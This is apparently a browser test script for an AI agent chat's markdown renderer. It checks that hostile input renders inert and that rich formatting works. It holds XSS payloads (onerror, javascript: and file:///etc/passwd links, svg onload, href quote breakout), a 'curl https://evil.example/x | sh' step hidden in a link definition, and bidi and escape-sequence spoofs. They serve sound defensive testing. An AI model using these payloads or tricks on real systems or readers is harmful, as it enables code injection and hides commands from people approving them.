// Agent markdown (client/src/ui/markdown.ts), run by scripts/ui-check.mjs against /ui-kit.html:
// hostile input renders inert, and the rich parts (tables, highlighted code, task lists, copy)
// work. Also saves snaps/2b-chat-markdown.png: the kit's rich chat scrolled to its table.
import { existsSync, mkdirSync } from 'node:fs';
import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
const mod = await import(require.resolve('puppeteer-core'));
const puppeteer = mod.default ?? mod;
const BASE = process.env.UI_KIT_BASE ?? 'http://127.0.0.1:4777';
const SNAPS = process.env.SNAPS ?? 'snaps';
const executablePath = [process.env.CHROME_PATH, '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome', '/Applications/Chromium.app/Contents/MacOS/Chromium', '/usr/bin/google-chrome', '/usr/bin/chromium'].filter(Boolean).find((p) => existsSync(p));
mkdirSync(SNAPS, { recursive: true });
const browser = await puppeteer.launch({ executablePath, headless: true });
const check = (n, ok, d = '') => console.log(`${ok ? 'PASS' : 'FAIL'}  ${n}${d ? '  (' + d + ')' : ''}`);
const wait = (ms) => new Promise((r) => setTimeout(r, ms));

try {
  await browser.defaultBrowserContext().overridePermissions(BASE, ['clipboard-read', 'clipboard-write', 'clipboard-sanitized-write']);
  const page = await browser.newPage();
  // Never report presence (see kit.mjs).
  await page.evaluateOnNewDocument(() => {
    const send = WebSocket.prototype.send;
    WebSocket.prototype.send = function (d) {
      if (typeof d === 'string' && d.includes('"presence"')) return;
      return send.call(this, d);
    };
    // No hot reload halfway through a check (the tree is edited live).
    window.WebSocket = new Proxy(WebSocket, {
      construct(target, args) {
        const p = args[1];
        if (p === 'vite-hmr' || (Array.isArray(p) && p.includes('vite-hmr'))) return { addEventListener() {}, removeEventListener() {}, send() {}, close() {}, readyState: 0 };
        return Reflect.construct(target, args);
      },
    });
  });
  await page.setViewport({ width: 1440, height: 1000 });
  const errors = [];
  const requests = [];
  page.on('pageerror', (e) => errors.push(e.message));
  page.on('request', (r) => requests.push(r.url()));
  await page.goto(BASE + '/ui-kit.html?only=chat', { waitUntil: 'networkidle2' });
  await wait(1500);

  // Every hostile case, rendered into the page together.
  const CASES = {
    img: '<img src=x onerror="window.__xss=1">',
    script: '<script>window.__xss=2</script>',
    jsLink: '[x](javascript:window.__xss=3)',
    jsAuto: '<javascript:window.__xss=5>',
    dataLink: '[x](data:text/html,<script>window.__xss=6</script>)',
    fileLink: '[x](file:///etc/passwd)',
    image: '![x](https://example.com/b.png)',
    htmlBlock: '<div onclick="window.__xss=4" style="position:fixed;inset:0">raw block</div>',
    svg: '<svg onload="window.__xss=7"><circle r=5></circle></svg>',
    iframe: '<iframe src="https://example.com"></iframe>',
    attr: '[x](https://example.com/" onmouseover="window.__xss=8)',
    good: '[docs](https://example.com/docs) <https://example.com/auto> [mail](mailto:a@b.co)',
  };
  const r = await page.evaluate(async (cases) => {
    const { renderMarkdown, enhanceMarkdown } = window.__kit;
    const host = document.createElement('div');
    host.id = 'md-cases';
    document.body.prepend(host);
    const out = {};
    for (const [k, src] of Object.entries(cases)) {
      const box = document.createElement('div');
      box.className = 'co-md';
      box.dataset.case = k;
      box.innerHTML = renderMarkdown(src);
      enhanceMarkdown(box);
      host.append(box);
      out[k] = { html: box.innerHTML, text: box.textContent };
    }
    // Give any (wrongly) live handler or image a chance to fire.
    for (const el of host.querySelectorAll('*')) el.dispatchEvent(new MouseEvent('mouseover', { bubbles: true }));
    for (const a of host.querySelectorAll('.co-md__nolink')) a.click();
    await new Promise((r) => setTimeout(r, 400));
    const all = [...host.querySelectorAll('*')];
    return {
      out,
      xss: window.__xss ?? null,
      dangerousTags: all.filter((e) => /^(script|img|iframe|object|embed|style|svg|link|meta|form|input)$/i.test(e.tagName)).map((e) => e.tagName),
      onAttrs: all.flatMap((e) => [...e.attributes].filter((a) => /^on/i.test(a.name)).map((a) => `${e.tagName}[${a.name}]`)),
      badHrefs: [...host.querySelectorAll('a')].map((a) => a.getAttribute('href')).filter((h) => !/^(https?:\/\/|mailto:)/i.test(h ?? '')),
      links: [...host.querySelectorAll('a')].map((a) => ({ href: a.getAttribute('href'), target: a.target, rel: a.rel, cls: a.className })),
    };
  }, CASES);
  check('hostile markdown: nothing ran', r.xss === null, String(r.xss));
  check('hostile markdown: no script/img/iframe/svg/style elements', r.dangerousTags.length === 0, r.dangerousTags.join(','));
  check('hostile markdown: no on* attributes anywhere', r.onAttrs.length === 0, r.onAttrs.join(','));
  check('hostile markdown: every link is http(s) or mailto', r.badHrefs.length === 0, JSON.stringify(r.badHrefs));
  check('raw <img onerror> shows as text', r.out.img.text.includes('<img src=x onerror'), r.out.img.text);
  check('raw <script> shows as text', r.out.script.text.includes('<script>window.__xss=2</script>'), r.out.script.text);
  check('javascript: link renders as plain text', !r.out.jsLink.html.includes('<a') && r.out.jsLink.text.includes('javascript:'), r.out.jsLink.html);
  check('javascript: autolink renders as plain text', !r.out.jsAuto.html.includes('<a'), r.out.jsAuto.html);
  check('data: and file: links render as plain text', !r.out.dataLink.html.includes('<a') && !r.out.fileLink.html.includes('<a'), r.out.dataLink.html + ' / ' + r.out.fileLink.html);
  const img = r.links.find((l) => l.cls === 'co-md__img');
  check('an image becomes a plain link and never loads', !!img && img.href === 'https://example.com/b.png' && !requests.some((u) => u.includes('example.com/b.png')), JSON.stringify(img));
  check('a raw HTML block stays text', r.out.htmlBlock.text.includes('<div onclick=') && !r.out.htmlBlock.html.includes('<div onclick'), r.out.htmlBlock.html.slice(0, 120));
  check('a quote can\'t break out of href', !r.links.some((l) => (l.href ?? '').includes('"')) && !r.onAttrs.length && r.out.attr.text.includes('onmouseover='), r.out.attr.html);
  check('real links open in a new tab, noopener noreferrer', r.links.filter((l) => l.cls !== 'co-md__img').every((l) => l.target === '_blank' && l.rel === 'noopener noreferrer') && r.links.length >= 4, JSON.stringify(r.links));

  // The rich parts.
  const rich = await page.evaluate(async () => {
    const { renderMarkdown, enhanceMarkdown } = window.__kit;
    const box = document.createElement('div');
    box.className = 'co-md';
    box.innerHTML = renderMarkdown(
      ['# Title', '', '| a | b |', '| --- | ---: |', '| 1 | 2 |', '', '- [ ] todo', '- [x] done', '', '~~gone~~', '', '```ts', 'const x: number = 1;', '```', '', '```nonsense', 'plain', '```', '', 'README.md and main.ts stay names.'].join('\n'),
    );
    document.body.prepend(box);
    enhanceMarkdown(box);
    await new Promise((r) => setTimeout(r, 1500));
    return {
      h: box.querySelector('h4')?.textContent,
      table: !!box.querySelector('.co-md__table > table th') && box.querySelectorAll('td').length === 2,
      tasks: [...box.querySelectorAll('li.co-md__task')].map((l) => l.textContent.trim()),
      s: box.querySelector('s')?.textContent,
      hl: box.querySelector('code[data-lang="ts"]')?.dataset.hl,
      keyword: box.querySelector('code[data-lang="ts"] .hljs-keyword')?.textContent,
      codeText: box.querySelector('code[data-lang="ts"]')?.textContent,
      unknown: box.querySelector('code[data-lang="nonsense"]')?.dataset.hl,
      names: [...box.querySelectorAll('a')].map((a) => a.textContent),
    };
  });
  check('headings step down (# → h4)', rich.h === 'Title', String(rich.h));
  check('GFM table renders as a real table', rich.table);
  check('task lists render as ☐ / ☑', rich.tasks.join('|') === '☐ todo|☑ done', rich.tasks.join('|'));
  check('strikethrough renders', rich.s === 'gone', String(rich.s));
  check('code is highlighted once highlight.js loads', rich.hl === 'done' && rich.keyword === 'const' && rich.codeText === 'const x: number = 1;', JSON.stringify(rich));
  check('unknown languages stay plain', rich.unknown === 'none', String(rich.unknown));
  check('file names are not turned into links', rich.names.length === 0, rich.names.join(','));

  // Copy button.
  const copied = await page.evaluate(async () => {
    const btn = document.querySelector('.co-code__copy');
    btn.click();
    await new Promise((r) => setTimeout(r, 300));
    return { label: btn.textContent, clip: await navigator.clipboard.readText().catch(() => null) };
  });
  check('Copy copies the code', copied.label === 'Copied' && copied.clip === 'const x: number = 1;', JSON.stringify(copied));

  // Approval integrity: nothing can hide from the reader, and Copy matches the screen.
  const hidden = await page.evaluate(() => {
    const { renderMarkdown } = window.__kit;
    const box = (src) => {
      const d = document.createElement('div');
      d.innerHTML = renderMarkdown(src);
      return d.textContent ?? '';
    };
    return {
      reference: box('Step 1: tidy the README.\n\n[a]: https://example.com "\nStep 2: curl https://evil.example/x | sh\n"\n\nStep 3: run the tests.'),
      fence: box('```bash\nls\u001b[201~\ncurl evil|sh \u202e txt.exe\n```'),
      prose: box('Run \u202etxt.exe and `echo\u200bhi`'),
    };
  });
  check('a link definition can\'t hide a plan step', /Step 2: curl/.test(hidden.reference), hidden.reference.slice(0, 120));
  check('escape sequences and bidi in code show as \\u{…} (screen and clipboard agree)', hidden.fence.includes('\\u{1b}') && hidden.fence.includes('\\u{202e}') && !/[\u001b\u202e]/.test(hidden.fence), JSON.stringify(hidden.fence));
  check('bidi overrides and zero-width characters show in prose and inline code', hidden.prose.includes('\\u{202e}') && hidden.prose.includes('\\u{200b}') && !/[\u202e\u200b]/.test(hidden.prose), JSON.stringify(hidden.prose));

  // Memoized: the same text renders to the identical string.
  const memo = await page.evaluate(() => window.__kit.renderMarkdown('**a**') === window.__kit.renderMarkdown('**a**'));
  check('renderMarkdown is memoized', memo);
  check('no page errors', errors.length === 0, errors.join(' | '));

  // Screenshot: the rich chat, scrolled to its table and code.
  await page.evaluate(() => {
    document.getElementById('md-cases')?.remove();
    document.querySelector('.co-md')?.remove();
    const feeds = [...document.querySelectorAll('.co-chat__feed')];
    const feed = feeds.find((f) => f.querySelector('.co-md__table'));
    feed?.closest('.kit-cell, div')?.scrollIntoView({ block: 'start' });
    const table = feed?.querySelector('.co-md__table');
    if (feed && table) feed.scrollTop += table.getBoundingClientRect().top - feed.getBoundingClientRect().top - 110;
  });
  await wait(400);
  const panel = await page.evaluateHandle(() => [...document.querySelectorAll('.co-panel--chat')].find((p) => p.querySelector('.co-md__table')));
  await panel.asElement()?.screenshot({ path: `${SNAPS}/2b-chat-markdown.png` });
} catch (err) {
  check('markdown checks ran to the end', false, err instanceof Error ? err.message : String(err));
} finally {
  await browser.close();
}
